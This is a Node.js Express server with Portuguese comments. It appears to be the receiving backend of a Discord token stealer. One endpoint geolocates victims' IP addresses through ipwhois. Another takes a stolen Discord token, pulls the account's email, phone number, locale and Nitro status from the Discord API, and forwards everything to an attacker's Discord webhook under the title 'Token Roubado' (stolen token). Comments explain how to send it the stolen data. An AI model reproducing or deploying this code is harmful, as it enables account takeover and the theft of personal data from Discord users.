async function controlApi() {

    const express = require("express");
    const request = require("sync-request");
    const discord = require("discord.js");
    const wb = new discord.WebhookClient("id da sua webhook", "token da sua webhook")
    const server = express();
    const bodyParser = require("body-parser")
    const urlencodedParser = bodyParser.urlencoded({extended: false})
  
    server.use(bodyParser.json())
    server.get('/', urlencodedParser, (req, res) => {
      res.send(`Se tudo fosse fácil, qualquer um conseguiria fazer`)
    })
    
    //url para o post: suaurl/ip
    //envie em json para o post, como "ip": "Sua variável de ip/ou/seu ip"
    server.post('/ip', urlencodedParser, (req, res) => {
        res.send("Ip recebido")

        let dt =  JSON.parse(request("GET", `https://ipwhois.app/json/${req.body.ipzin}`, {
    }).body)
          
          const ipini = new discord.MessageEmbed()
          .setTitle("Ip infos")
          .setDescription(`
          **ip:** ${req.body.ipzin}
          **continente:** ${dt.continent}
          **código do continente:** ${dt.continent_code}
          **país:** ${dt.country}
          **Código do país:** ${dt.country_code}
          **país_capital:** ${dt.country_capital}
          **país_ddd:** ${dt.country_phone}
          **região:** ${dt.region}
          **cidade:** ${dt.city}
          **latitude:** ${dt.latitude}
          **longitude:** ${dt.longitude}
          **asn:** ${dt.asn}
          **org:** ${dt.org}
          **isp:** ${dt.isp}
          `)
          .setColor("#ae0000")
          .setThumbnail(dt.country_flag)
          if(req.body.ipzin == undefined) return console.log("Ip inválido")
          else
          if(req.body.ipzin != undefined){
            wb.send(ipini)
          }
    })

    
    //url para o post: suaurl/token
    //envie em json para o post, como "tk": "Sua variável de tokens/ou/seu token"
    server.post('/token', urlencodedParser, (req, res) => {
        res.send("Token recebido")

        let user =  JSON.parse(request("GET", 'https://discord.com/api/v9/users/@me', {
            headers: {
                "Content-Type": "application/json",
                "authorization": req.body.tk
            }
        }).body)
        
        if (user.premium_type == 1) {
            var nitro = "Nitro Classic"
        } else if (user.premium_type == 2) {
            var nitro = "Nitro Gaming"
        } else if (user.premium_type == undefined) {
            var nitro = "Pobre"
        }
        
        var username = user.username + "#" + user.discriminator
        var id = user.id
        var email = user.email
        var telefone = user.phone
        var local = user.locale
        var avatar = user.avatar
        
        if (email == null) {
            email = "Sem email"
        }
        if (telefone == null) {
            telefone = "Sem telefone"
        }
        if (avatar == null) {
            avatar = "https://media.discordapp.net/attachments/937890624408002560/940006760570294382/e6e9241ecb37975aafa800bd38e9d64a.png"
        } else {
            avatar = `https://cdn.discordapp.com/avatars/${id}/${avatar}.png?`
        }
        
        
        
        const bm = new discord.MessageEmbed()
            .setTitle("Token Roubado")
            .setColor("#ae0000")
            .addField("Nick:", username)
            .addField("Id:", id)
            .addField("Gmail", email)
            .addField("Telefone", telefone)
            .addField("Local", local)
            .addField("Nitro?:", nitro)
            .addField("Token:", `||${req.body.tk}||`)
            .setFooter("Infos By: kakau")
            .setThumbnail(avatar)
          if(id == undefined) return console.log("Token inválido recebido")
           else 
         wb.send(bm)
    })
    
    
    server.listen(process.env.PORT || 8877, () => {
        console.log('Conectado ao servidor')
    })
    console.log("Função executada")
    }
    controlApi()